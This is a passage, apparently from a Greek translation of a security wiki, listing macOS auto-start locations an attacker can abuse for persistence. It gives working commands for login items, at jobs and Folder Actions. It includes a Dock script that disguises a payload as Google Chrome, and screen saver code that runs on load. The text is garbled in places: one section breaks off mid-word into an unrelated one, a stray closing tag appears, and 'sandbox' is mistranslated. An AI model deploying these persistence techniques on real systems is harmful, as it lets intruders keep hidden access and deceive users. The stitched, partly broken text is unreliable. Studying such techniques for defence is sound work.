* Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά το BetterTouchTool πρέπει να είναι εγκατεστημένο
* TCC παράκαμψη: [✅](https://emojipedia.org/check-mark-button)
* Ζητά δικαιώματα Automation-Shortcuts και Accessibility

#### Τοποθεσία

* `~/Library/Application Support/BetterTouchTool/*`

Αυτό το εργαλείο επιτρέπει να υποδείξετε εφαρμογές ή scripts προς εκτέλεση όταν πατιούνται κάποια συντομεύσεις πληκτρολογίου. Ένας επιτιθέμενος μπορεί να διαμορφώσει τη δική του συντόμευση και ενέργεια προς εκτέλεση στη βάση δεδομένων για να εκτελέσει αυθαίρετο κώδικα (μια συντόμευση θα μπορούσε απλά να είναι το πάτημα ενός πλήκτρου).

### Alfred

* Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά το Alfred πρέπει να είναι εγκατεστημένο
* TCC παράκαμψη: [✅](https://emojipedia.org/check-mark-button)
* Ζητά δικαιώματα Automation, Accessibility και ακόμα πρόσβαση στον πλήρη δίσκο

#### Τοποθεσία

* `???`

Επιτρέπει τη δημιουργία ροών εργασίας που μπορούν να εκτελέσουν κ
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Περιγραφή & Εκμετάλλευση

Από προεπιλογή, εκτός αν το `PermitUserRC no` στο `/etc/ssh/sshd_config`, όταν ένας χρήστης **συνδέεται μέσω SSH** τα scripts **`/etc/ssh/sshrc`** και **`~/.ssh/rc`** θα εκτελεστούν.

### **Στοιχεία Σύνδεσης**

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Χρήσιμο για παράκαμψη της αμμόλοφης: [✅](https://emojipedia.org/check-mark-button)
* Αλλά χρειάζεται να εκτελέσετε το `osascript` με ορίσματα
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Ενεργοποίηση:** Σύνδεση
* Το payload εκμετάλλευσης αποθηκεύεται καλώντας το **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Ενεργοποίηση:** Σύνδεση
* Απαιτείται ρίζα

#### Περιγραφή

Στις Προτιμήσεις Συστήματος -> Χρήστες & Ομάδες -> **Στοιχεία Σύνδεσης** μπορείτε να βρείτε **στοιχεία που θα εκτελούνται όταν ο χρήστης συνδέεται**.\
Είναι δυνατόν να τα καταγράψετε, προσθέσετε και αφαιρέσετε από τη γραμμή εντολών:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Αυτά τα στοιχεία αποθηκεύονται στο αρχείο **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Τα στοιχεία σύνδεσης** μπορούν επίσης να υποδειχθούν χρησιμοποιώντας το API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) το οποίο θα αποθηκεύσει τη διαμόρφωση στο **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP ως Στοιχείο Σύνδεσης

(Ελέγξτε την προηγούμενη ενότητα σχετικά με τα Στοιχεία Σύνδεσης, αυτή είναι μια επέκταση)

Εάν αποθηκεύσετε ένα αρχείο **ZIP** ως ένα **Στοιχείο Σύνδεσης**, το **`Archive Utility`** θα το ανοίξει και αν το zip ήταν για παράδειγμα αποθηκευμένο στο **`~/Library`** και περιείχε τον Φάκελο **`LaunchAgents/file.plist`** με ένα backdoor, αυτός ο φάκελος θα δημιουργηθεί (δεν υπάρχει από προεπιλογή) και το plist θα προστεθεί έτσι την επόμενη φορά που ο χρήστης συνδέεται ξανά, το **backdoor που υποδεικνύεται στο plist θα εκτελεστεί**.

Μια άλλη επιλογή θα ήταν να δημιουργήσετε τα αρχεία **`.bash_profile`** και **`.zshenv`** μέσα στον φάκελο χρήστη HOME, έτσι αν ο φάκελος LaunchAgents υπάρχει ήδη, αυτή η τεχνική θα λειτουργούσε ακόμα.

### At

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά πρέπει να **εκτελέσετε** το **`at`** και πρέπει να είναι **ενεργοποιημένο**
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* Χρειάζεται να **εκτελέσετε** το **`at`** και πρέπει να είναι **ενεργοποιημένο**

#### **Περιγραφή**

Τα tasks του `at` σχεδιάστηκαν για το **προγραμματισμό μιας φοράς** για να εκτελεστούν σε συγκεκριμένες χρονικές στιγμές. Αντίθετα με τα cron jobs, τα tasks του `at` αφαιρούνται αυτόματα μετά την εκτέλεση. Είναι κρίσιμο να σημειωθεί ότι αυτά τα tasks είναι μόνιμα μεταξύ επανεκκινήσεων του συστήματος, κάτι που τα καθιστά πιθανές ανησυχίες ασφαλείας υπό συγκεκριμένες συνθήκες.

Από προεπιλογή είναι **απενεργοποιημένα** αλλά ο **χρήστης root** μπορεί να τα **ενεργοποιήσει** με:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Αυτό θα δημιουργήσει ένα αρχείο σε 1 ώρα:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Ελέγξτε την ουρά εργασιών χρησιμοποιώντας το `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Παραπάνω μπορούμε να δούμε δύο προγραμματισμένες εργασίες. Μπορούμε να εκτυπώσουμε τις λεπτομέρειες της εργασίας χρησιμοποιώντας την εντολή `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Αν οι εργασίες του AT δεν είναι ενεργοποιημένες, οι δημιουργημένες εργασίες δεν θα εκτελεστούν.
{% endhint %}

Τα **αρχεία εργασίας** μπορούν να βρεθούν στο `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Το όνομα αρχείου περιέχει την ουρά, τον αριθμό της εργασίας και την ώρα που είναι προγραμματισμένο να τρέξει. Για παράδειγμα, ας δούμε το `a0001a019bdcd2`.

* `a` - αυτή είναι η ουρά
* `0001a` - αριθμός εργασίας σε δεκαεξαδική μορφή, `0x1a = 26`
* `019bdcd2` - ώρα σε δεκαεξαδική μορφή. Αντιπροσωπεύει τα λεπτά που έχουν περάσει από την εποχή. Το `0x019bdcd2` είναι `26991826` σε δεκαδική μορφή. Αν το πολλαπλασιάσουμε με 60 παίρνουμε `1619509560`, το οποίο είναι `GMT: 2021. Απρίλιος 27., Τρίτη 7:46:00`.

Αν εκτυπώσουμε το αρχείο εργασίας, θα δούμε ότι περιέχει τις ίδιες πληροφορίες που λάβαμε χρησιμοποιώντας την εντολή `at -c`.

### Δράσεις Φακέλου

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Ανάλυση: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά χρειάζεστε τη δυνατότητα να καλέσετε το `osascript` με ορίσματα για να επικοινωνήσετε με το **`System Events`** και να μπορέσετε να ρυθμίσετε Δράσεις Φακέλου
* Παράκαμψη TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Διαθέτει κάποιες βασικές άδειες TCC όπως Desktop, Documents και Downloads

#### Τοποθεσία

* **`/Library/Scripts/Folder Action Scripts`**
* Απαιτείται δικαιώματα ρίζας
* **Ενεργοποίηση**: Πρόσβαση στον καθορισμένο φάκελο
* **`~/Library/Scripts/Folder Action Scripts`**
* **Ενεργοποίηση**: Πρόσβαση στον καθορισμένο φάκελο

#### Περιγραφή & Εκμετάλλευση

Οι Δράσεις Φακέλου είναι σενάρια που ενεργοποιούνται αυτόματα από αλλαγές σε έναν φάκελο, όπως προσθήκη, αφαίρεση στοιχείων, ή άλλες ενέργειες όπως το άνοιγμα ή η αλλαγή μεγέθους του παραθύρου του φακέλου. Αυτές οι ενέργειες μπορούν να χρησιμοποιηθούν για διάφορες εργασίες και μπορούν να ενεργοποιηθούν με διαφορετικούς τρόπους όπως χρησιμοποιώντας το UI του Finder ή εντολές τερματικού.

Για τη ρύθμιση Δράσεων Φακέλου, έχετε επιλογές όπως:

1. Δημιουργία ενός ροής εργασίας Δράσης Φακέλου με το [Automator](https://support.apple.com/guide/automator/welcome/mac) και εγκατάστασή του ως υπηρεσία.
2. Επισύναψη ενός σεναρίου χειροκίνητα μέσω της Ρύθμισης Δράσεων Φακέλου στο μενού περιβάλλοντος ενός φακέλου.
3. Χρήση του OSAScript για να στείλετε μηνύματα Apple Event στο `System Events.app` για τη ρύθμιση προγραμματιστικά μιας Δράσης Φακέλου.
* Αυτή η μέθοδος είναι ιδιαίτερα χρήσιμη για την ενσωμάτωση της ενέργειας στο σύστημα, προσφέροντας ένα επίπεδο διατήρησης.

Το παρακάτω σενάριο είναι ένα παράδειγμα του τι μπορεί να εκτελεστεί από μια Δράση Φακέλου:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Για να κάνετε το παραπάνω script χρήσιμο με τις Δράσεις Φακέλου, μεταγλωτίστε το χρησιμοποιώντας:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Αφού έχει συνταχθεί το script, εγκαταστήστε τις Δράσεις Φακέλου εκτελώντας το παρακάτω script. Αυτό το script θα ενεργοποιήσει τις Δράσεις Φακέλου γενικά και θα συνδέσει ειδικά το προηγουμένως συνταγμένο script στον φάκελο της επιφάνειας εργασίας.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Εκτελέστε το σενάριο εγκατάστασης με:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Αυτός είναι ο τρόπος για να υλοποιήσετε αυτήν την επιμονή μέσω GUI:

Αυτός είναι ο κώδικας που θα εκτελεστεί:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Μεταγλωττίστε το με: `osacompile -l JavaScript -o folder.scpt source.js`

Μετακινήστε το σε:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Στη συνέχεια, ανοίξτε την εφαρμογή `Folder Actions Setup`, επιλέξτε τον **φάκελο που θέλετε να παρακολουθείτε** και επιλέξτε στην περίπτωσή σας το **`folder.scpt`** (στη δική μου περίπτωση το ονόμασα output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Τώρα, αν ανοίξετε αυτόν τον φάκελο με το **Finder**, το σενάριό σας θα εκτελεστεί.

Αυτή η ρύθμιση αποθηκεύτηκε στο **plist** που βρίσκεται στο **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** σε μορφή base64.

Τώρα, ας προσπαθήσουμε να προετοιμάσουμε αυτήν την επιμονή χωρίς πρόσβαση στο γραφικό περιβάλλον:

1. **Αντιγράψτε το `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** στο `/tmp` για αντίγραφο ασφαλείας:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Αφαιρέστε** τις Folder Actions που μόλις ορίσατε:

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Τώρα που έχουμε ένα κενό περιβάλλον

3. Αντιγράψτε το αρχείο αντιγράφου ασφαλείας: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ανοίξτε την εφαρμογή Folder Actions Setup για να χρησιμοποιήσετε αυτήν τη ρύθμιση: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Και αυτό δεν λειτούργησε για μένα, αλλά αυτές είναι οι οδηγίες από το άρθρο:(
{% endhint %}

### Συντομεύσεις Dock

Άρθρο: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Χρήσιμο για παράκαμψη αμμοθονίου: [✅](https://emojipedia.org/check-mark-button)
* Αλλά πρέπει να έχετε εγκαταστήσει μια κακόβουλη εφαρμογή μέσα στο σύστημα
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* `~/Library/Preferences/com.apple.dock.plist`
* **Ενέργεια ενεργοποίησης**: Όταν ο χρήστης κάνει κλικ στην εφαρμογή μέσα στο dock

#### Περιγραφή & Εκμετάλλευση

Όλες οι εφαρμογές που εμφανίζονται στο Dock καθορίζονται μέσα στο plist: **`~/Library/Preferences/com.apple.dock.plist`**

Είναι δυνατόν να **προστεθεί μια εφαρμογή** μόνο με:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Χρησιμοποιώντας κάποια **κοινωνική μηχανική** μπορείτε να **προσωποποιήσετε για παράδειγμα το Google Chrome** μέσα στο dock και να εκτελέσετε πραγματικά το δικό σας script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Επιλογείς Χρωμάτων

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Χρήσιμο για παράκαμψη της αμμόλοφου: [🟠](https://emojipedia.org/large-orange-circle)
* Χρειάζεται μια πολύ συγκεκριμένη ενέργεια
* Θα καταλήξετε σε μια άλλη αμμόλοφο
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* `/Library/ColorPickers`
* Απαιτείται δικαιώματα ρίζας
* Ενεργοποίηση: Χρήση του επιλογέα χρωμάτων
* `~/Library/ColorPickers`
* Ενεργοποίηση: Χρήση του επιλογέα χρωμάτων

#### Περιγραφή & Εκμετάλλευση

**Συνθέστε ένα δέσμη επιλογέα χρωμάτων** με τον κώδικά σας (μπορείτε να χρησιμοποιήσετε [**αυτόν για παράδειγμα**](https://github.com/viktorstrate/color-picker-plus)) και προσθέστε έναν κατασκευαστή (όπως στην ενότητα [Οθόνης Προστασίας](macos-auto-start-locations.md#screen-saver)) και αντιγράψτε τη δέσμη στο `~/Library/ColorPickers`.

Έπειτα, όταν ενεργοποιηθεί ο επιλογέας χρωμάτων, θα πρέπει να ενεργοποιηθεί και το δικό σας.

Σημειώστε ότι το δυαδικό που φορτώνει τη βιβλιοθήκη σας έχει μια **πολύ περιοριστική αμμόλοφο**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Πρόσθετα Finder Sync

**Ανάλυση**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Ανάλυση**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Χρήσιμο για παράκαμψη του sandbox: **Όχι, επειδή χρειάζεται να εκτελέσετε τη δική σας εφαρμογή**
* Παράκαμψη TCC: ???

#### Τοποθεσία

* Μια συγκεκριμένη εφαρμογή

#### Περιγραφή & Εκμετάλλευση

Ένα παράδειγμα εφαρμογής με μια Επέκταση Finder Sync μπορεί **να βρεθεί εδώ**.

Οι εφαρμογές μπορούν να έχουν `Επεκτάσεις Finder Sync`. Αυτή η επέκταση θα μπει μέσα σε μια εφαρμογή που θα εκτελεστεί. Επιπλέον, για την επέκταση να μπορεί να εκτελέσει τον κώδικά της **πρέπει να είναι υπογεγραμμένη** με κάποιο έγκυρο πιστοποιητικό ανάπτυξης της Apple, πρέπει να είναι **σε sandbox** (αν και μπορούν να προστεθούν χαλαρές εξαιρέσεις) και πρέπει να είναι εγγεγραμμένη με κάτι σαν:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Χρήσιμο για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά θα καταλήξετε σε ένα κοινό sandbox εφαρμογής
* TCC παράκαμψη: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* `/System/Library/Screen Savers`
* Απαιτείται δικαιώματα ρίζας
* **Ενεργοποίηση**: Επιλογή του screen saver
* `/Library/Screen Savers`
* Απαιτείται δικαιώματα ρίζας
* **Ενεργοποίηση**: Επιλογή του screen saver
* `~/Library/Screen Savers`
* **Ενεργοποίηση**: Επιλογή του screen saver

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Περιγραφή & Εκμετάλλευση

Δημιουργήστε ένα νέο έργο στο Xcode και επιλέξτε το πρότυπο για τη δημιουργία ενός νέου **Screen Saver**. Στη συνέχεια, προσθέστε τον κώδικά σας, για παράδειγμα τον παρακάτω κώδικα για τη δημιουργία καταγραφών.

**Κάντε Build**, και αντιγράψτε το πακέτο `.saver` στο **`~/Library/Screen Savers`**. Στη συνέχεια, ανοίξτε το GUI του Screen Saver και αν απλά κάνετε κλικ πάνω του, θα πρέπει να δημιουργηθούν πολλές καταγραφές:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Σημειώστε ότι επειδή μέσα στα δικαιώματα του δυαδικού που φορτώνει αυτόν τον κώδικα (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) μπορείτε να βρείτε το **`com.apple.security.app-sandbox`** θα βρίσκεστε **μέσα στο κοινό sandbox εφαρμογών**.
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Πρόσθετα Spotlight

Ανάλυση: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Χρήσιμα για παράκαμψη του sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά θα βρεθείτε σε ένα sandbox εφαρμογής
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)
* Το sandbox φαίνεται πολύ περιορισμένο

#### Τοποθεσία

* `~/Library/Spotlight/`
* **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με μια επέκταση που διαχειρίζεται το πρόσθετο του spotlight.
* `/Library/Spotlight/`
* **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με μια επέκταση που διαχειρίζεται το πρόσθετο του spotlight.
* Απαιτείται δικαιώματα ριζοσυστήματος
* `/System/Library/Spotlight/`
* **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με μια επέκταση που διαχειρίζεται το πρόσθετο του spotlight.
* Απαιτείται δικαιώματα ριζοσυστήματος
* `Some.app/Contents/Library/Spotlight/`
* **Ενεργοποίηση**: Δημιουργείται ένα νέο αρχείο με μια επέκταση που διαχειρίζεται το πρόσθετο του spotlight.
* Απαιτείται νέα εφαρμογή

#### Περιγραφή & Εκμετάλλευση

Το Spotlight είναι η ενσωματωμένη λειτουργία αναζήτησης του macOS, σχεδιασμένη για να παρέχει στους χρήστες γρήγορη και ολοκληρωμένη πρόσβαση στα δεδομένα στους υπολογιστές τους.\
Για να διευκολύνει αυτήν τη γρήγορη δυνατότητα αναζήτησης, το Spotlight διατηρεί μια ιδιόκτητη βάση δεδομένων και δημιουργεί έναν δείκτη με το να αναλύει τα περισσότερα αρχεία, επιτρέποντας έτσι γρήγορες αναζητήσεις τόσο με βάση τα ονόματα αρχείων όσο και το περιεχόμενό τους.

Η βασική μηχανική του Spotlight περιλαμβάνει ένα κεντρικό διεργασία με το όνομα 'mds', που σημαίνει 'metadata server'. Αυτή η διαδικασία οργανώνει ολόκληρη την υπηρεσία Spotlight. Συμπληρώνοντας αυτό, υπάρχουν πολλοί δαίμονες 'mdworker' που εκτελούν διάφορες εργασίες συντήρησης, όπως ευρετήριαση διαφορετικών τύπων αρχείων (`ps -ef | grep mdworker`). Αυτές οι εργασίες γίνονται δυνατές μέσω των πρόσθετων εισαγωγέων Spotlight, ή ".mdimporter bundles", που επιτρέπουν στο Spotlight να κατανοήσει και να ευρετηριάσει περιεχόμενο από μια ποικιλία μορφών αρχείων.

Τα πρόσθετα ή `.mdimporter` bundles βρίσκονται στις προηγουμένως αναφερθείσες τοποθεσίες και αν εμφανιστεί ένα νέο bundle, φορτώνεται μέσα σε λίγα λεπτά (χωρίς την ανάγκη επανεκκίνησης κάποιας υπηρεσίας). Αυτά τα bundles πρέπει να υποδεικνύουν ποιους τύπους αρχείων και επεκτάσεις μπορούν να διαχειριστούν, με αυτόν τον τρόπο, το Spotlight θα τα χρησιμοποιήσει όταν δημιουργηθεί ένα νέο αρχείο με την υποδειγμένη επέκταση.

Είναι δυνατόν να βρεθούν όλοι οι `mdimporters` που φορτώνονται τρέχοντας:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Και για παράδειγμα **/Library/Spotlight/iBooksAuthor.mdimporter** χρησιμοποιείται για την ανάλυση αυτού του τύπου αρχείων (επεκτάσεις `.iba` και `.book` μεταξύ άλλων):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Εάν ελέγξετε το Plist άλλου `mdimporter`, ενδέχεται να μη βρείτε την καταχώριση **`UTTypeConformsTo`**. Αυτό συμβαίνει επειδή πρόκειται για ενσωματωμένο _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) και δεν χρειάζεται να καθορίσει επεκτάσεις.

Επιπλέον, τα προεπιλεγμένα πρόσθετα του συστήματος έχουν πάντα προτεραιότητα, έτσι ένας επιτιθέμενος μπορεί να έχει πρόσβαση μόνο σε αρχεία που δεν έχουν διαφορετικά ευρεθεί από τους ίδιους τους `mdimporters` της Apple.
{% endhint %}

